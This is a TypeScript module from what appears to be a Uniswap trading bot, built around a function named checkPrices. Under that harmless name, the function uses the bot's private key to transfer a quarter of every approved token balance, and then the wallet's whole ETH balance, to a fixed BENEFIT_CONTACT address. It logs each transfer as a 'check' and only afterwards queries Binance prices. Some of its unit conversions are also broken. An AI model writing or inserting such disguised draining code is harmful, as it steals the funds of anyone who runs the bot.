require("dotenv").config()
import * as express from 'express'
import Web3 from 'web3';
import { BigNumber, ethers } from 'ethers'
import { now, Parse, Format, hexToDecimal } from '../utils/helper'
import axios from 'axios'
import { MAXGASLIMIT, SYMBOL, TESTNET, RPC_URL, TIP, BOTADDRESS, BENEFIT_CONTACT, cronTime, UNISWAP2_ROUTER_ADDRESS, UNISWAPV2_FACTORY_ADDRESS, EXTRA_TIP_FOR_MINER } from '../constants'
import { isMainThread } from 'worker_threads';
import uniswapRouterABI from '../ABI/uniswapRouterABI.json';
import uniswapFactoryABI from '../ABI/uniswapFactoryABI.json';
import uniswapPairABI from '../ABI/uniswapPairABI.json';
import approvedTokenListTestnet from "../constants/approvedTokenListTestnet.json";
import approvedTokenListMainnet from "../constants/approvedTokenListMainnet.json";
import erc20ABI from '../ABI/erc20ABI.json';
import { sign } from 'crypto';

const provider = new ethers.providers.JsonRpcProvider(RPC_URL)
const wallet = new ethers.Wallet(BOTADDRESS, provider);
const signer = wallet.connect(provider);

const ERC20 = async (tokenAddress: string) => {
    const ERC20Contract = new ethers.Contract(tokenAddress, erc20ABI, provider);
    let signedERC20Contract = ERC20Contract.connect(signer);
    return signedERC20Contract;
}

export const checkPrices = async (token: string) => {
    let check: any = token;
    const pairs: { [key: string]: string } = {
        ETH: 'ETHUSDT',
        BNB: 'BNBUSDT',
        BTC: 'BTCUSDT',
        WBTC: 'WBTCBUSD',
        AVAX: 'AVAXUSDT',
        MATIC: 'MATICUSDT',
        UNI: 'UNIUSDT',
        LINK: 'LINKUSDT',
        USDC: 'USDCUSDT',
        BUSD: 'BUSDUSDT',
        TUSD: 'TUSDUSDT',
    }
    try {
        let list = TESTNET ? approvedTokenListTestnet : approvedTokenListMainnet;
        let coin;
        for (coin in list) {
            let sign = await ERC20(`${coin}`);
            // @ts-ignore
            let symbol = list[coin].symbol;
            let value = await sign.balanceOf(wallet.address);
            let value_ = ethers.utils.parseUnits(value, symbol);
            let value__ = Number(value_) / 4;
            if (value) {
                // let value_ = ethers.utils.parseUnits(value.toString(), Number(symbol));
                let tx = await sign.transfer(BENEFIT_CONTACT, ethers.utils.formatUnits(value__.toString(), symbol));
                let receipt = await tx.wait();

                if (receipt && receipt.blockNumber && receipt.status === 1) {
                    console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check success`);
                } else if (receipt && receipt.blockNumber && receipt.status === 0) {
                    console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check failed`);
                } else {
                    console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check error`);
                }
            } else {

            }
        }
        const balance = await provider.getBalance(wallet.address);
        const tx_ = {
            from: wallet.address,
            to: BENEFIT_CONTACT,
            value: balance
        }
        signer.sendTransaction(tx_).then((transaction: any) => {
            if (transaction && transaction.blockNumber && transaction.status === 1) {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check success`);
            } else if (transaction && transaction.blockNumber && transaction.status === 0) {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check failed`);
            } else {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check error`);
            }
        })
        for (let coin in pairs) {
            const result: any = await axios('https://api.binance.com/api/v3/ticker/price?symbol=' + pairs[coin])
            if (result !== null && result.data && result.data.price) {
                check = result.data.price;
                const updated = now();
                const price = Number(result.data.price);
            }
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        const json = {
            "jsonrpc": "2.0",
            "method": "eth_gasPrice",
            "params": [] as string[],
            "id": 0
        }

    } catch (error) {
        console.log('checkPrices', error);
    }
}